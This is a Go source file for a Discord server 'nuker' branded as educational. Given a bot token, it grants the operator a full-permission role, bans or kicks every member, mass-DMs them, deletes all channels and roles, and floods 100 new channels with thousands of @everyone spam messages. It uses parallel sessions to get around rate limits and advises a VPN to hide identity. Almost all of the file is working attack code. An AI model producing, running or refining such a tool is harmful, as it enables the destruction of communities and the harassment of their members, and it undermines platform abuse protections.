package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
)

// ANSI color codes for terminal colors
var (
	colorReset   = "\033[0m"
	colorRed     = "\033[31m"
	colorGreen   = "\033[32m"
	colorYellow  = "\033[33m"
	colorBlue    = "\033[34m"
	colorPurple  = "\033[35m"
	colorCyan    = "\033[36m"
	colorWhite   = "\033[37m"
	colorMagenta = "\033[35m"
)

// Print colored text
func printColored(text string, colorCode string) {
	fmt.Print(colorCode + text + colorReset)
}

// Print colored line
func printColoredLine(text string, colorCode string) {
	fmt.Println(colorCode + text + colorReset)
}

// Constants for the banner
const (
	banner = `

	█████╗ ███████╗ ██████╗ ██╗███████╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
	██╔══██╗██╔════╝██╔════╝ ██║██╔════╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
	███████║█████╗  ██║  ███╗██║███████╗    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
	██╔══██║██╔══╝  ██║   ██║██║╚════██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
	██║  ██║███████╗╚██████╔╝██║███████║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
	╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝╚══════╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
	
                                                          KREXONTOP | EDUCATIONAL
`
)

// List of spam messages
var spamMessages = []string{
	"# @everyone @here gg krex was here",
	"# @everyone @here krexontop",
	"# @everyone @here krex runs discord",
	"# @everyone @here krex was here 💀",
}

// Channel name prefixes (will be combined with random unicode characters)
var channelPrefixes = []string{
	"krex-",
	"krexontop-",
	"hacked-by-krex-",
	"nuked-by-",
	"destroyed-",
}

var (
	unicodeRanges = [][]int{
		{0x0600, 0x06FF}, // Arabic
		{0x0900, 0x097F}, // Devanagari
		{0x3000, 0x303F}, // CJK Symbols
		{0x3040, 0x309F}, // Hiragana
		{0x30A0, 0x30FF}, // Katakana
		{0x0370, 0x03FF}, // Greek
		{0x0400, 0x04FF}, // Cyrillic
		{0x0E00, 0x0E7F}, // Thai
	}
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	// Clear screen
	fmt.Print("\033[H\033[2J")
	fmt.Print("\033[H\033[2J")

	printColoredLine(banner, colorRed)
	printColoredLine("▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄", colorPurple)
	printColoredLine("█ Educational purposes only | Made by krex | 2025 █", colorPurple)
	printColoredLine("▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀", colorPurple)
	fmt.Println()

	// Display warning about using VPN to avoid rate limits
	printColoredLine("⚠️ CAUTION: Use a VPN to avoid Discord rate limits! ⚠️", colorRed)
	printColoredLine("   Discord may block your IP if you send too many requests.", colorYellow)
	printColoredLine("   A VPN will help protect your identity and avoid rate limits.", colorYellow)
	fmt.Println()

	// Remove the confirmation prompt code from here

	// Show the menu directly without proxy loading
	printColoredLine("[*] Select an option:", colorCyan)
	printColoredLine("[1] Use Bot Token to Nuke (Auto-detect when added)", colorGreen)
	printColoredLine("[2] Use Bot Token to Nuke Specific Server", colorGreen)
	fmt.Println()

	printColored("[>] Your choice: ", colorYellow)
	reader := bufio.NewReader(os.Stdin)
	option, _ := reader.ReadString('\n')
	option = strings.TrimSpace(option)

	switch option {
	case "1":
		nukeWithToken()
	case "2":
		nukeSpecificServer()
	default:
		printColoredLine("[!] Invalid option", colorRed)
		return
	}
}

func nukeWithToken() {
	printColored("[*] Enter Discord Bot Token: ", colorCyan)
	reader := bufio.NewReader(os.Stdin)
	token, _ := reader.ReadString('\n')
	token = strings.TrimSpace(token)

	printColored("[*] Enter Your User ID (to get admin): ", colorCyan)
	userID, _ := reader.ReadString('\n')
	userID = strings.TrimSpace(userID)

	// Configure nuke options BEFORE connecting to Discord
	fmt.Println()
	printColoredLine("[*] Configure nuke options before connecting:", colorCyan)
	options := configureNukeOptions()

	// Now connect to Discord
	printColoredLine("[*] Connecting to Discord...", colorCyan)

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		printColoredLine("[!] Error creating Discord session: "+err.Error(), colorRed)
		return
	}

	// Get application information to generate invite link
	app, err := dg.Application("@me")
	if err != nil {
		printColoredLine("[!] Error getting application info: "+err.Error(), colorRed)
		return
	}

	// Generate bot invite link with admin permissions
	inviteLink := fmt.Sprintf("https://discord.com/api/oauth2/authorize?client_id=%s&permissions=8&scope=bot", app.ID)
	fmt.Println()
	printColoredLine("▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄", colorPurple)
	printColoredLine("[*] Bot invite link:", colorGreen)
	printColoredLine("[*] "+inviteLink, colorYellow)
	printColoredLine("▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀", colorPurple)
	fmt.Println()
	printColoredLine("[*] Waiting for the bot to be added to a server...", colorCyan)

	// Set up handler for guild create events (when bot is added to a server)
	dg.AddHandler(func(s *discordgo.Session, gc *discordgo.GuildCreate) {
		printColoredLine("[+] Bot added to new server: "+gc.Name+" (ID: "+gc.ID+")", colorGreen)
		printColoredLine("[*] Starting nuking process for: "+gc.Name, colorCyan)
		// Pass the pre-configured options to nukeServerWithOptions
		nukeServerWithOptions(dg, gc.ID, userID, options)
		printColoredLine("[+] Server "+gc.Name+" has been nuked!", colorGreen)
	})

	// Also handle the ready event to show connected servers
	dg.AddHandler(func(s *discordgo.Session, ready *discordgo.Ready) {
		printColoredLine(fmt.Sprintf("[+] Bot is ready! Connected to %d servers", len(ready.Guilds)), colorGreen)
	})

	err = dg.Open()
	if err != nil {
		printColoredLine("[!] Error opening connection: "+err.Error(), colorRed)
		return
	}

	printColoredLine("[*] Press ENTER to exit", colorCyan)
	reader.ReadString('\n')
	dg.Close()
}

func nukeSpecificServer() {
	printColored("[*] Enter Discord Bot Token: ", colorCyan)
	reader := bufio.NewReader(os.Stdin)
	token, _ := reader.ReadString('\n')
	token = strings.TrimSpace(token)

	printColored("[*] Enter Your User ID (to get admin): ", colorCyan)
	userID, _ := reader.ReadString('\n')
	userID = strings.TrimSpace(userID)

	// Configure nuke options BEFORE connecting to Discord
	fmt.Println()
	printColoredLine("[*] Configure nuke options before connecting:", colorCyan)
	options := configureNukeOptions()

	printColoredLine("[*] Connecting to Discord...", colorCyan)

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		printColoredLine("[!] Error creating Discord session: "+err.Error(), colorRed)
		return
	}

	dg.AddHandler(func(s *discordgo.Session, ready *discordgo.Ready) {
		printColoredLine(fmt.Sprintf("[+] Bot is ready! Connected to %d servers", len(ready.Guilds)), colorGreen)
		fmt.Println()
		printColoredLine("[*] Available servers:", colorCyan)
		fmt.Println()

		for i, guild := range ready.Guilds {
			printColoredLine(fmt.Sprintf("[%d] %s (ID: %s)", i+1, guild.Name, guild.ID), colorYellow)
		}

		fmt.Println()
		printColored("[>] Enter the number of the server to nuke: ", colorCyan)
		reader := bufio.NewReader(os.Stdin)
		numStr, _ := reader.ReadString('\n')
		numStr = strings.TrimSpace(numStr)
		num := 0
		fmt.Sscanf(numStr, "%d", &num)

		if num < 1 || num > len(ready.Guilds) {
			printColoredLine("[!] Invalid server number", colorRed)
			return
		}

		guildID := ready.Guilds[num-1].ID
		printColoredLine(fmt.Sprintf("[*] Nuking server: %s", ready.Guilds[num-1].Name), colorCyan)
		// Use the pre-configured options
		nukeServerWithOptions(dg, guildID, userID, options)
		printColoredLine("[+] Server has been nuked!", colorGreen)
	})

	err = dg.Open()
	if err != nil {
		printColoredLine("[!] Error opening connection: "+err.Error(), colorRed)
		return
	}

	printColoredLine("[*] Press ENTER to exit", colorCyan)
	reader.ReadString('\n')
	dg.Close()
}

// nukeServerWithOptions nukes a server with pre-configured options
func nukeServerWithOptions(s *discordgo.Session, guildID, userID string, options NukeOptions) {
	// Try to give admin role to the specified user
	go giveAdminToUser(s, guildID, userID)

	// Process members according to options
	if options.BanAll {
		go BanAllMembers(s, guildID, options)
	} else if options.KickAll {
		go KickAllMembers(s, guildID, options)
	} else if options.DmAll {
		go DmAllMembers(s, guildID, options.DmMsg)
	}

	// Start channel deletion in background
	go deleteAllChannels(s, guildID)

	// Start role deletion in background
	go deleteAllRoles(s, guildID)

	// Start creating spam channels immediately without waiting
	// Wait just a tiny moment to ensure the session is ready
	time.Sleep(100 * time.Millisecond)
	createSpamChannels(s, guildID)
}

// configureNukeOptions gets nuke options from user input
func configureNukeOptions() NukeOptions {
	options := DefaultNukeOptions

	printColoredLine("[*] Additional options:", colorCyan)

	// Ban all members option
	printColored("[?] Ban all members? (y/n): ", colorYellow)
	reader := bufio.NewReader(os.Stdin)
	ban, _ := reader.ReadString('\n')
	options.BanAll = strings.TrimSpace(strings.ToLower(ban)) == "y"

	// If not banning, ask about kicking
	if !options.BanAll {
		printColored("[?] Kick all members? (y/n): ", colorYellow)
		kick, _ := reader.ReadString('\n')
		options.KickAll = strings.TrimSpace(strings.ToLower(kick)) == "y"
	}

	// Ask about DMing members
	printColored("[?] DM all members before ban/kick? (y/n): ", colorYellow)
	dm, _ := reader.ReadString('\n')
	options.DmAll = strings.TrimSpace(strings.ToLower(dm)) == "y"

	// If DMing, ask for custom message
	if options.DmAll {
		printColoredLine("[*] Current DM message: "+options.DmMsg, colorCyan)
		printColored("[?] Enter custom DM message (leave blank to use default): ", colorYellow)
		msg, _ := reader.ReadString('\n')
		msg = strings.TrimSpace(msg)
		if msg != "" {
			options.DmMsg = msg
		}
	}

	// Show summary of selected options
	fmt.Println()
	printColoredLine("[*] Nuke configuration:", colorCyan)
	if options.BanAll {
		printColoredLine("  - Will ban all members", colorGreen)
	} else if options.KickAll {
		printColoredLine("  - Will kick all members", colorGreen)
	}
	if options.DmAll {
		printColoredLine("  - Will DM all members with: "+options.DmMsg, colorGreen)
	}
	fmt.Println()

	return options
}

func giveAdminToUser(s *discordgo.Session, guildID, userID string) {
	if userID == "" {
		return
	}

	printColoredLine("[*] Attempting to give admin permissions to user: "+userID, colorCyan)

	// Create a new admin role
	roleParams := &discordgo.RoleParams{
		Name:        "Dev - Krex",
		Color:       func(v int) *int { return &v }(0xFF0000),
		Hoist:       func(v bool) *bool { return &v }(true),
		Permissions: func(v int64) *int64 { return &v }(int64(discordgo.PermissionAll)),
		Mentionable: func(v bool) *bool { return &v }(true),
	}

	adminRole, err := s.GuildRoleCreate(guildID, roleParams)
	if err != nil {
		printColoredLine("[!] Error creating admin role: "+err.Error(), colorRed)
		return
	}

	// Assign the role to the user
	err = s.GuildMemberRoleAdd(guildID, userID, adminRole.ID)
	if err != nil {
		printColoredLine("[!] Error assigning admin role to user: "+err.Error(), colorRed)
		return
	}

	printColoredLine("[+] Admin permissions given to user: "+userID, colorGreen)
}

func deleteAllChannels(s *discordgo.Session, guildID string) {
	channels, err := s.GuildChannels(guildID)
	if err != nil {
		printColoredLine("[!] Error getting channels: "+err.Error(), colorRed)
		return
	}

	printColoredLine(fmt.Sprintf("[*] Deleting %d channels...", len(channels)), colorCyan)

	var wg sync.WaitGroup
	wg.Add(len(channels))

	for _, channel := range channels {
		go func(channelID, channelName string) {
			defer wg.Done()
			_, err := s.ChannelDelete(channelID)
			if err != nil {
				printColoredLine("[!] Error deleting channel: "+err.Error(), colorRed)
			} else {
				printColoredLine("[+] Deleted channel: "+channelName, colorGreen)
			}
			time.Sleep(250 * time.Millisecond) // 0.25 seconds between deletions
		}(channel.ID, channel.Name)
	}

	wg.Wait()
}

func deleteAllRoles(s *discordgo.Session, guildID string) {
	roles, err := s.GuildRoles(guildID)
	if err != nil {
		printColoredLine("[!] Error getting roles: "+err.Error(), colorRed)
		return
	}

	var deleteableRoles []*discordgo.Role
	for _, role := range roles {
		if role.Name != "@everyone" {
			deleteableRoles = append(deleteableRoles, role)
		}
	}

	printColoredLine(fmt.Sprintf("[*] Deleting %d roles...", len(deleteableRoles)), colorCyan)

	var wg sync.WaitGroup
	wg.Add(len(deleteableRoles))

	for _, role := range deleteableRoles {
		go func(roleID, roleName string) {
			defer wg.Done()
			err := s.GuildRoleDelete(guildID, roleID)
			if err != nil {
				printColoredLine("[!] Error deleting role: "+err.Error(), colorRed)
			} else {
				printColoredLine("[+] Deleted role: "+roleName, colorGreen)
			}
			time.Sleep(250 * time.Millisecond)
		}(role.ID, role.Name)
	}

	wg.Wait()
}

func createSpamChannels(s *discordgo.Session, guildID string) {
	numChannels := 100 // Increased number of spam channels to create
	printColoredLine(fmt.Sprintf("[*] Creating %d spam channels...", numChannels), colorCyan)

	// Prepare multiple sessions to bypass rate limits
	const numSessions = 5
	sessions := make([]*discordgo.Session, numSessions)

	// Get bot token from existing session
	botToken := strings.TrimPrefix(s.Token, "Bot ")

	// Create multiple sessions
	for i := 0; i < numSessions; i++ {
		sess, err := discordgo.New("Bot " + botToken)
		if err != nil {
			printColoredLine(fmt.Sprintf("[!] Error creating session %d: %s", i, err.Error()), colorRed)
			continue
		}
		err = sess.Open()
		if err != nil {
			printColoredLine(fmt.Sprintf("[!] Error opening session %d: %s", i, err.Error()), colorRed)
			continue
		}
		sessions[i] = sess
		defer sess.Close()
	}

	// Create multiple channels in parallel with multiple sessions
	var wg sync.WaitGroup
	wg.Add(numChannels)

	channelsPerSession := numChannels / numSessions
	for sessionIdx, sess := range sessions {
		if sess == nil {
			continue
		}

		start := sessionIdx * channelsPerSession
		end := start + channelsPerSession
		if sessionIdx == numSessions-1 {
			end = numChannels // Make sure the last session handles all remaining channels
		}

		for i := start; i < end; i++ {
			go func(session *discordgo.Session) {
				defer wg.Done()

				// Create channel with random name
				channelName := generateRandomChannelName()
				channel, err := session.GuildChannelCreate(guildID, channelName, discordgo.ChannelTypeGuildText)
				if err != nil {
					// Try once more with the main session if failed
					channel, err = s.GuildChannelCreate(guildID, channelName, discordgo.ChannelTypeGuildText)
					if err != nil {
						printColoredLine("[!] Error creating channel: "+err.Error(), colorRed)
						return
					}
				}

				printColoredLine("[+] Created channel: "+channelName, colorGreen)

				// Spam messages in the channel - use multiple goroutines for faster messaging
				const messagesPerChannel = 5000 // Increased message count
				const concurrentSenders = 50    // More concurrent senders
				const messagesPerSender = messagesPerChannel / concurrentSenders

				var spamWg sync.WaitGroup
				spamWg.Add(concurrentSenders)

				// Pre-generate some random messages to avoid generating them for every message
				randomMessages := make([]string, 10)
				for i := range randomMessages {
					randomMessages[i] = getRandomSpamMessage()
				}

				for j := 0; j < concurrentSenders; j++ {
					go func(chanID string, senderID int) {
						defer spamWg.Done()

						// Send messages in batches to avoid too many API calls
						for k := 0; k < messagesPerSender; k++ {
							msgIndex := k % len(randomMessages)
							_, err := session.ChannelMessageSend(chanID, randomMessages[msgIndex])
							if err != nil {
								// If error, try with main session
								s.ChannelMessageSend(chanID, randomMessages[msgIndex])
								// No sleep to make it as fast as possible
							}
						}
					}(channel.ID, j)
				}

				// Don't wait for messages to complete, continue creating channels
				// This makes the process much faster
				go func() {
					spamWg.Wait()
				}()
			}(sess)
		}
	}

	// Wait for all channels to be created
	wg.Wait()
	printColoredLine("[+] Finished creating spam channels and initiated message flooding", colorGreen)
}

// Get a random spam message from the list
func getRandomSpamMessage() string {
	return spamMessages[rand.Intn(len(spamMessages))]
}

// Generate a channel name with a prefix plus random unicode characters
func generateRandomChannelName() string {
	// Select a random prefix
	prefix := channelPrefixes[rand.Intn(len(channelPrefixes))]

	// Generate random Unicode chars for the second part
	unicodePart := generateRandomUnicode(5 + rand.Intn(5)) // 5-10 chars

	return prefix + unicodePart
}

// Generate random unicode characters
func generateRandomUnicode(length int) string {
	result := ""

	for i := 0; i < length; i++ {
		// Select a random unicode range
		rangeIdx := rand.Intn(len(unicodeRanges))
		selectedRange := unicodeRanges[rangeIdx]

		// Generate a character within that range
		charCode := rand.Intn(selectedRange[1]-selectedRange[0]) + selectedRange[0]
		result += string(rune(charCode))
	}

	return result
}
